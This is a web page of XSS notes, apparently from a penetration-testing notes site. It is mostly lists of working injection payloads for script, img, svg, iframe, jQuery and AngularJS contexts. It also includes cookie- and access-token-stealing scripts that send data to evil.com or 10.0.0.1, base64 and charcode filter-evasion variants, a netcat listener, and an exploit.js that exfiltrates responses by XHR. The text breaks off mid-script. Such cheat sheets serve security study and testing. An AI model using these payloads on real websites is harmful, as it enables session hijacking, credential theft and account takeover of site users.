<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>XSS (Cross-Site Scripting) - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "XSS (Cross-Site Scripting)", url: "#_top", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="xss-cross-site-scripting">XSS (Cross-Site Scripting)</h1>
<p>XSS enables attackers to injection client-side scripts into web applications.</p>
<div class="language-text highlight"><pre><span></span><code>- [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
- h[xss-without-parentheses-and-semi-colons](ttps://portswigger.net/research/xss-without-parentheses-and-semi-colons)
- [XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
- [XSS_Filter_Evasion_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [brutelogic.com.br](https://brutelogic.com.br/blog/building-xss-polyglots/)
- [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
</code></pre></div>
<div data-pagefind-ignore>

## Payloads

We can insert them into **URL params**,  **POST params** or **HTTP headers**.  
Additionary, we can also find CVE related XSS [here](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=xss).

### Script Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&lt;script&gt;alert(1)&lt;/script&gt;
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>&#39;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>&lt;script&gt;onerror=alert;throw 123&lt;/script&gt;
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>&lt;script&gt;{onerror=alert}throw 123&lt;/script&gt;
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>&lt;script&gt;throw onerror=alert,&#39;hello&#39;,123,&#39;world&#39;&lt;/script&gt;
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>&lt;script&gt;fetch(&#39;/profile?new_password=password&#39;);&lt;/script&gt;
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>%3Cscript%3Ealert%281%29%3C%2Fscript%3E
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>&#39;;alert(1);&#39;
</span></code></pre></div>

In addition, we may be able to execute our JavaScript file which is hosted on our server.

<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&lt;script src=&quot;https://evil.com/evil.js&quot;&gt;&lt;/script&gt;
</span></code></pre></div>

### Img Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&quot; src=1 onerror=alert(1)&gt;
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>&quot;&gt;&lt;/span&gt;&lt;img src=1 onerror=alert(1)&gt;
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>&lt;img src=&quot;javascript:alert(1)&quot;&gt;
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>&lt;img src=&quot;jav ascript:alert(1)&quot;&gt;
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>&lt;img src=&quot;jav&amp;#x09;ascript:alert(1)&quot;&gt;
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>&lt;img src=&quot;jav&amp;#x0A;ascript:alert(1)&quot;&gt;
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>&lt;img dynsrc=&quot;javascript:alert(1)&quot;&gt;
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>&lt;img lowsrc=&quot;javascript:alert(1)&quot;&gt;
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>&lt;img src=http://10.0.0.1/&gt;
</span></code></pre></div>

### SVG Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&quot;&gt;&lt;svg onload=alert(1)&gt;
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>&lt;svg onmouseover=&quot;alert(1)&quot;&gt;&lt;/svg&gt;
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>&lt;svg&gt;&lt;animatetransform onclick=&quot;alert(1)&quot;&gt;&lt;/svg&gt;
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;
</span></code></pre></div>

### Input Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&lt;input autofocus onfocus=alert(1)&gt;
</span></code></pre></div>

### Select Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&lt;select autofocus onfocus=alert(1)&gt;
</span></code></pre></div>

### Anchor Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&lt;a onmouseover=alert(1)&gt;click&lt;/a&gt;
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click&lt;/a&gt;
</span></code></pre></div>

### Iframe Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&lt;iframe src=http://10.0.0.1:8000/xss.js&gt;&lt;/iframe&gt;
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;
</span></code></pre></div>

### Body Tags

<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&lt;body onload=alert(/XSS/.source)&gt;
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&lt;body background=&quot;javascript:alert(1)&quot;&gt;
</span></code></pre></div>

### HTML Entity

Reference: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode)

<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cm">&lt;!-- &lt;img src=javascript:alert(&#39;XSS&#39;)&gt; --&gt;</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span><span class="p">&gt;</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="cm">&lt;!-- onerror=&quot;javascript:alert(&#39;XSS&#39;)&quot; --&gt;</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;</span><span class="p">&gt;</span>
</span></code></pre></div>

### Others

<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&quot; onmouseleave=&#39;alert(1)&#39;&quot;&gt;
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>javascript:alert(1)
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>\&quot;-alert(1)//
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>/?q=&amp;subparam=--&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>/index.php#value=&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span></code></pre></div>

To find tags, events and payloads for XSS, we can see [Port Swigger's XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

<br />

## Payloads - JQuery

<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>https://example.com/#&lt;img src=1 onerror=alert(1)&gt;
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&lt;iframe src=&quot;https://example.com/#&quot; onload=&quot;this.src+=&#39;&lt;img src=1 onerror=alert(1)&gt;&#39;&quot;&gt;
</span></code></pre></div>

<br />

## Payloads - AngularJS

If you find **`<html ng-app>`**, **`<body ng-app>`** or **`<div ng-app>`** in the HTML source code, you may be able to abuse it by XSS.

<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>https://example.com/?search={{$eval.constructor(&#39;alert(1)&#39;)()}}
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>https://example.com/?search={{$on.constructor(&#39;alert(1)&#39;)()}}
</span></code></pre></div>

To perform XSS without **`$eval`** function and quotes, we might be able to take another approach.  
[This PortSwigger's lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings) provides the following payload. But sorry, I don‚Äôt understand how it works at the moment.

<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># toString() : Create a string without quotes.
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a># toString().constructor.prototype.charAt=[].join :  Override `charAt` function for all strings with `[].join`.
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a># [1]|orderBy:toString().constructor.fromCharCode(...) : Pass an array to the `orderBy` filter.
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a># 120,61,97,108,101,114,116,40,49,41 : It means `x=alert(1)` in decimal.
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>https://example.com/?q=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
</span></code></pre></div>

### AngularJS and CSP (Content Security Policy)

Reference: [PortSwigger's lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

If the website uses AngularJS with CSP (**`ng-csp`**) as below,

<div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">ng-app</span> <span class="na">ng-csp</span><span class="p">&gt;</span>
</span></code></pre></div>

We need to bypass them by using a focus event (**`ng-focus`**), 

<div class="language-html highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#39;;
</span></code></pre></div>

<br />

## Polyglot XSS

<div class="language-html highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>jaVasCript:/*-/*`/*\`/*&#39;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//<span class="err">&lt;</span>/stYle/<span class="err">&lt;</span>/titLe/<span class="err">&lt;</span>/teXtarEa/<span class="err">&lt;</span>/scRipt/--!&gt;\x3csVg/<span class="p">&lt;</span><span class="nt">sVg</span><span class="err">/</span><span class="na">oNloAd</span><span class="o">=</span><span class="s">alert()//</span><span class="p">&gt;</span>\x3e
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>&quot;&gt;&gt;<span class="p">&lt;</span><span class="nt">marquee</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">confirm(1)</span><span class="p">&gt;&lt;/</span><span class="nt">marquee</span><span class="p">&gt;</span>&quot; &gt;<span class="err">&lt;</span>/plaintext\&gt;<span class="err">&lt;</span>/|\&gt;<span class="p">&lt;</span><span class="nt">plaintext</span><span class="err">/</span><span class="na">onmouseover</span><span class="o">=</span><span class="s">prompt(1)</span> <span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>@gmail.com<span class="p">&lt;</span><span class="nt">isindex</span> <span class="na">formaction</span><span class="o">=</span><span class="s">javascript:alert(/XSS/)</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span><span class="p">&gt;</span>&#39;--&gt;&quot; &gt;<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&quot;&gt;<span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">id</span><span class="o">=</span><span class="s">&quot;confirm&amp;lpar; 1)&quot;</span><span class="err">/</span><span class="na">alt</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="na">src</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="na">onerror</span><span class="o">=</span><span class="s">eval(id&amp;%23x29;</span><span class="p">&gt;</span>&#39;&quot;&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http: //i.imgur.com/P8mL8.jpg&quot;</span><span class="p">&gt;</span>
</span></code></pre></div>

<br />

## Cookie Stealing

### One-line Payload

<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>&lt;script&gt;window.location.href=&quot;https://evil.com/?c=&quot;+document.cookie&lt;/script&gt;
</span></code></pre></div>

We may retrieve the victim user cookie in our access log of `evil.com`.

### Another Approach

Inject the following payload into input fields in a target website.

<div class="language-html highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;http://evil.com/?&quot;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">));&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">c</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://evil.com/</span><span class="si">${</span><span class="nx">c</span><span class="si">}</span><span class="sb">`</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">c</span><span class="o">=</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">);</span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://evil.com/</span><span class="si">${</span><span class="nx">c</span><span class="si">}</span><span class="sb">`</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="cm">&lt;!-- POST --&gt;</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;http://10.0.0.1/&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="w">    </span><span class="p">});</span>
</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div>

To retrieve data, start web server or listener in local machine.

<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo python3 -m http.server 80
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a># or
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>sudo nc -lvp 80
</span></code></pre></div>

<br />

## Filter Evasion

### Base64 & Eval

Website may sanitize inputs to prevent from malicious code. However, we might be able to circumvent by modifying our code.  
For example, convert JavaScript code to Base64 string, then insert the base64 string into the **‚Äúeval‚Äù** function as below.

<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iICsgZG9jdW1lbnQuY29va2llKTs= : fetch(&quot;http://evil.com/&quot;+document.cookie);
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>&lt;img src=x onerror=&quot;eval(decode64(&#39;ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iICsgZG9jdW1lbnQuY29va2llKTs=&#39;))&quot;&gt;
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a># &#39;(&#39; =&gt; &#39;\x28&#39;
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a># &#39;)&#39; =&gt; &#39;\x29&#39;
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>&lt;img src=&quot;x&quot; onerror=eval.call`${&quot;eval\x28atob`ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iICsgZG9jdW1lbnQuY29va2llKTs=`\x29&quot;}`
</span></code></pre></div>

### Charcode & Eval

We can use charcode (we can generate easily in CiberChef with the Base10 option) of the payload as below.

<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>fetch(&quot;http://evil.com/&quot;+document.cookie);
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a># Charcode (Base10): 102,101,116,99,104,40,34,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59
</span></code></pre></div>

Then create **`eval`** function to use it.

<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>&lt;img src=x onerror=&quot;eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))&quot;&gt;
</span></code></pre></div>

<br />

## Interact with Another Host via XML HTTP Request

We might be able to send request the another host and retrieve the response.  
First, create a JavaScript file named **`exploit.js`** here. Replace **`http://evil.com`** with your local ip address.  
By this script, we send a request to **`http://sub.victim.com`** then fetch the response from the host.

- **GET Request**

<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>// exploit.js
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>var xhr = new XMLHttpRequest();
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>xhr.onreadystatechange = () =&gt; {
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>    if (xhr.readyState == XMLHttpRequest.DONE) {
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>        var xhr_exfil = new XMLHttpRequest();
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>        xhr_exfil.open(&#39;POST&#39;, &quot;http://evil.com:1234/&quot;, false);
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>        xhr_exfil.send(xhr.response);
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    }
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>};
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>xhr.open(&#39;GET&#39;, &quot;http://victim.com/index.php&quot;, false);
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>xhr.send();
</span></code></pre></div>

- **POST Request**

<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>// exploit.js
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>var xhr = new XMLHttpRequest();
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>xhr.onreadystatechange = () =&gt; {
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    if (xhr.readyState == XMLHttpRequest.DONE) {
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>        var xhr_exfil = new XMLHttpRequest();
